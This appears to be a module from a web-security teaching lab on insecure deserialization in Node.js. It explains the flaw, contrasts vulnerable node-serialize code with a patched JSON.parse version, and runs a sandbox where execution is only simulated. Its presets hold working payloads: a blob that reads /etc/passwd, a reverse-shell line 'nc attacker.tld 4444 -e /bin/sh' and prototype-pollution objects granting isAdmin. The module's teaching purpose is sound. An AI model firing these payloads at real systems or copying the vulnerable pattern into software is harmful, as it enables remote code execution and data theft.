/**
 * Bug module: Insecure Deserialization
 *
 * Self-contained. The sandbox simulates a server that stores session state as a
 * serialized blob and deserializes it on each request. The VULNERABLE path uses
 * a node-serialize-style deserializer that revives functions from the data and
 * runs self-invoking ones (RCE), and follows __proto__ / constructor keys
 * (prototype pollution). The PATCHED path uses JSON.parse (data only) and strips
 * dangerous keys.
 *
 * IMPORTANT: nothing here is actually eval'd and Object.prototype is never
 * touched — the deserializer's dangerous effects are SIMULATED so the lab page
 * itself stays safe. The payloads are real; the execution is mocked.
 */

const FUNC_MARKER = "_$$ND_FUNC$$_";

// ---- Mock command runner (for the code an RCE payload "executes") -----------
const FILES = {
  "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
  "/etc/shadow": "root:$6$rounds=656000$abc...:19000:0:99999:7:::",
};
function mockRun(cmd) {
  const c = cmd.trim();
  if (c.startsWith("cat ")) {
    const f = c.slice(4).trim();
    return FILES[f] ?? `cat: ${f}: No such file or directory`;
  }
  if (/\bnc\b|\/bin\/sh|bash\s+-i|\/bin\/bash/.test(c)) {
    return "reverse shell established to the attacker — full interactive control of the server";
  }
  if (c.startsWith("id")) return "uid=33(www-data) gid=33(www-data) groups=33(www-data)";
  return `$ ${c}\n(command executed with the web server's privileges)`;
}

// Given a revived function's source, simulate what running it does.
function simulateFunction(src) {
  const m = src.match(/exec(?:Sync|File)?\s*\(\s*['"`]([^'"`]+)[`'"]/);
  if (m) return mockRun(m[1]);
  return "(arbitrary attacker-controlled JavaScript executed during deserialization)";
}

function isIIFE(src) {
  return /\(\s*\)\s*;?\s*$/.test(src.trim()); // self-invokes: ...()
}

// ---- Detection walks (no eval, no prototype mutation) -----------------------

function findFunctions(value, hits) {
  if (typeof value === "string" && value.startsWith(FUNC_MARKER)) {
    hits.push(value.slice(FUNC_MARKER.length));
  } else if (value && typeof value === "object") {
    for (const k of Object.keys(value)) findFunctions(value[k], hits);
  }
  return hits;
}

function findPollution(value, hits) {
  if (value && typeof value === "object") {
    for (const k of Object.keys(value)) {
      if (k === "__proto__") hits.push({ via: "__proto__", payload: value[k] });
      else if (k === "constructor" && value[k] && typeof value[k] === "object" && "prototype" in value[k]) {
        hits.push({ via: "constructor.prototype", payload: value[k].prototype });
      }
      if (value[k] && typeof value[k] === "object") findPollution(value[k], hits);
    }
  }
  return hits;
}

function pollutionEffect(hits) {
  const props = [];
  for (const h of hits) {
    if (h.payload && typeof h.payload === "object") {
      for (const p of Object.keys(h.payload)) props.push(`Object.prototype.${p} = ${JSON.stringify(h.payload[p])}`);
    }
  }
  return props;
}

// Analyze a blob the way a node-serialize-style deserializer would, but simulated.
function analyze(blob) {
  let obj;
  try {
    obj = JSON.parse(blob);
  } catch (e) {
    return { parseError: e.message };
  }
  const funcs = findFunctions(obj, []);
  const pollution = findPollution(obj, []);
  const executed = funcs.filter(isIIFE).map(simulateFunction);
  return { obj, funcs, pollution, executed };
}

// ---- Module definition ------------------------------------------------------

export default {
  id: "insecure-deserialization",
  title: "Insecure Deserialization",
  severity: "Critical",
  category: "Software & data integrity",
  cwe: "CWE-502",
  summary:
    "Deserializing untrusted data with a format that carries types/code lets an attacker run code, pollute prototypes, or forge trusted objects.",

  explanation: `
    <p>Insecure deserialization happens when an application takes untrusted,
    serialized data and <strong>reconstructs objects from it with a deserializer
    that can do more than read data</strong> — instantiate arbitrary types, revive
    functions, or trigger "magic" methods. The format carries <em>code/type
    information</em>, not just values, and the parser acts on it.</p>
    <p>The payoff depends on the language and library, but it's the same bug:</p>
    <ul>
      <li><strong>Node (node-serialize):</strong> a value tagged
        <code>${FUNC_MARKER}</code> is revived into a function; if it self-invokes
        (<code>…}()</code>) it runs the moment you deserialize — remote code
        execution.</li>
      <li><strong>PHP <code>unserialize()</code></strong> instantiates objects and
        fires <code>__wakeup</code>/<code>__destruct</code> (POP gadget chains);
        <strong>Python <code>pickle.loads</code></strong> runs
        <code>__reduce__</code>; <strong>Java <code>readObject</code></strong>
        drives gadget chains — all to RCE.</li>
      <li><strong>JavaScript prototype pollution:</strong> a
        <code>__proto__</code> / <code>constructor.prototype</code> key in the data
        mutates <code>Object.prototype</code>, changing every object in the app
        (auth bypass, DoS, sometimes RCE).</li>
    </ul>
    <p>It's worst because parsing the input <em>is</em> the trigger — no further
    "use" of the data is needed.</p>
  `,

  vulnerable: {
    lang: "javascript",
    label: "Vulnerable — node-serialize unserialize()",
    code: `const serialize = require("node-serialize");

app.get("/me", (req, res) => {
  // ❌ unserialize() revives functions in the blob; a self-invoking one
  //    (…}()) executes immediately — RCE straight from a cookie.
  const session = serialize.unserialize(req.cookies.session);
  res.json({ user: session.user });
});
// cookie: {"user":"_$$ND_FUNC$$_function(){ require('child_process')
//                 .exec('cat /etc/passwd'); }()"}`,
  },

  fixExplanation: `
    <p>Don't deserialize untrusted data with a format that can carry code or
    types. Use a <strong>pure-data format and a plain parser</strong>
    (<code>JSON.parse</code>), then:</p>
    <ul>
      <li><strong>Validate the shape</strong> against a schema after parsing —
        accept only the fields you expect, with the types you expect.</li>
      <li><strong>Strip dangerous keys</strong> (<code>__proto__</code>,
        <code>constructor</code>, <code>prototype</code>) or use
        <code>Object.create(null)</code> / a <code>Map</code> so prototype
        pollution has nothing to land on.</li>
      <li><strong>Protect integrity</strong> of anything you must trust round-trip:
        sign it (HMAC) or — better — keep trust state server-side behind an opaque
        session id, so the client never hands you objects at all.</li>
    </ul>
    <p>Language-specific: PHP <code>unserialize($x, ['allowed_classes' =&gt; false])</code>
    or JSON; Python never <code>pickle</code> untrusted input; Java use a
    look-ahead/allow-list <code>ObjectInputStream</code>.</p>
  `,
  patched: {
    lang: "javascript",
    label: "Patched — JSON.parse + key stripping + schema check",
    code: `app.get("/me", (req, res) => {
  let session;
  try {
    // ✅ data only — no functions, no type revival
    session = JSON.parse(req.cookies.session, (key, value) =>
      key === "__proto__" || key === "constructor" ? undefined : value);
  } catch { return res.status(400).send("bad session"); }

  // ✅ validate shape — accept only known fields/types
  if (typeof session.user !== "string") return res.status(400).send("bad session");
  res.json({ user: session.user });
  // Better still: store session state server-side; the cookie is just an id.
});`,
  },

  sandbox: {
    multiline: true,
    intro: `
      <p>This simulates a server deserializing a session blob (think a cookie or
      token) on every request. In <em>Vulnerable</em> mode it uses a
      node-serialize-style deserializer that revives functions and follows
      <code>__proto__</code>; flip to <em>Patched</em> for <code>JSON.parse</code>
      with dangerous keys stripped. <strong>Nothing is really executed</strong> —
      the deserializer's effects are simulated so this page stays safe.
      (<kbd>Ctrl/Cmd+Enter</kbd> to run.)</p>
    `,
    inputLabel: "Serialized session blob (JSON)",
    placeholder: '{"user":"alice"}',
    default: '{"user":"alice","items":[1,2,3]}',
    presets: [
      { label: "benign session", value: '{"user":"alice","items":[1,2,3]}' },
      { label: "RCE: read /etc/passwd", value: '{"user":"_$$ND_FUNC$$_function(){ require(\'child_process\').exec(\'cat /etc/passwd\'); }()"}' },
      { label: "RCE: reverse shell", value: '{"x":"_$$ND_FUNC$$_function(){ require(\'child_process\').exec(\'nc attacker.tld 4444 -e /bin/sh\'); }()"}' },
      { label: "prototype pollution (__proto__)", value: '{"user":"guest","__proto__":{"isAdmin":true}}' },
      { label: "prototype pollution (constructor)", value: '{"constructor":{"prototype":{"polluted":"yes"}}}' },
    ],

    run(input, { patched }) {
      try {
        input = typeof input === "string" ? input : String(input);
      } catch {
        input = "";
      }
      if (!input.trim()) {
        return { verdict: "safe", steps: [{ label: "Serialized blob", value: "(empty)" }], note: "Nothing to deserialize." };
      }

      const r = analyze(input);

      if (r.parseError) {
        return {
          verdict: "safe",
          steps: [
            { label: "Serialized blob", value: input },
            { label: "Result", value: "not valid JSON — nothing deserialized: " + r.parseError },
          ],
          note: "The blob didn't parse, so nothing happened — but a valid malicious blob would.",
        };
      }

      const malicious = r.executed.length > 0 || r.pollution.length > 0 || r.funcs.length > 0;

      if (patched) {
        const steps = [
          { label: "Serialized blob", value: input },
          { label: "Deserializer", value: "JSON.parse — data only; __proto__ / constructor stripped", flag: "good" },
        ];
        if (r.funcs.length) {
          steps.push({ label: "Function markers in data", value: `${r.funcs.length} — kept as inert strings, never revived or executed`, flag: "good" });
        }
        if (r.pollution.length) {
          steps.push({ label: "Prototype keys", value: "__proto__ / constructor stripped by the reviver — Object.prototype untouched", flag: "good" });
        }
        return {
          verdict: malicious ? "blocked" : "safe",
          steps,
          note: malicious
            ? "Same blob, neutralized: JSON.parse produces plain data — the function strings are " +
              "never turned into code, and the prototype keys are dropped. Add a schema check and the " +
              "shape is guaranteed too."
            : "Plain data parsed into a plain object — exactly as intended.",
        };
      }

      // Vulnerable path
      const steps = [
        { label: "Serialized blob", value: input },
        { label: "Deserializer", value: "node-serialize unserialize() — revives functions & follows __proto__", flag: "bad" },
      ];

      if (r.executed.length) {
        steps.push({ label: "Functions revived", value: `${r.funcs.length} (self-invoking — runs on deserialize)`, flag: "bad" });
        steps.push({ label: "Code executed (simulated)", value: r.executed.join("\n---\n"), flag: "bad" });
        return {
          verdict: "exploited",
          steps,
          note:
            "Remote code execution: the deserializer revived the attacker's function and ran it the " +
            "instant the blob was parsed — no further action needed. On a real server this runs with " +
            "the app's privileges.",
        };
      }

      if (r.pollution.length) {
        const effects = pollutionEffect(r.pollution);
        steps.push({ label: "Prototype pollution via", value: r.pollution.map((h) => h.via).join(", "), flag: "bad" });
        steps.push({ label: "Effect (simulated)", value: (effects.join("\n") || "Object.prototype mutated") + "\n→ every object in the app now inherits these properties", flag: "bad" });
        return {
          verdict: "exploited",
          steps,
          note:
            "Prototype pollution: a key in the data mutated Object.prototype, so every object app-wide " +
            "now carries the injected property (e.g. isAdmin=true → auth bypass). Simulated here; the " +
            "lab's own Object.prototype was not touched.",
        };
      }

      if (r.funcs.length) {
        steps.push({ label: "Functions revived", value: `${r.funcs.length} (not self-invoking — armed, runs if the app calls it)`, flag: "bad" });
        return {
          verdict: "exploited",
          steps,
          note: "The deserializer turned attacker data into a live function. It didn't self-invoke, but it now exists in the object graph and runs the moment the app calls it.",
        };
      }

      steps.push({ label: "Deserialized value", value: JSON.stringify(r.obj), flag: "good" });
      return {
        verdict: "safe",
        steps,
        note: "Plain data this time — but the deserializer would have revived a function or followed __proto__ if the blob contained one.",
      };
    },
  },

  references: [
    { label: "OWASP — Deserialization Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html" },
    { label: "OWASP A08:2021 — Software and Data Integrity Failures", url: "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" },
    { label: "PortSwigger — Insecure deserialization", url: "https://portswigger.net/web-security/deserialization" },
    { label: "CWE-502 — Deserialization of Untrusted Data", url: "https://cwe.mitre.org/data/definitions/502.html" },
  ],
};
